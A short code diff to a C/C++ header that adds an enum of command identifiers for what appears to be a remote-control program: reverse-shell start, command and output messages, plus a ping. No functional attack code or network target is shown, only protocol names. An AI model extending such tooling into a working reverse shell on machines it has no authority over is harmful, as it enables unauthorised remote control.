@@ -32,4 +32,13 @@ typedef unsigned int u_int;
 
 #define ___DEBUG_
 
+namespace EnumComandos {
+    enum Enum {
+        Reverse_Shell_Start = 500,
+        Reverse_Shell_Command,
+        Reverse_Shell_Salida,
+        PING
+    };
+}
+
 #endif
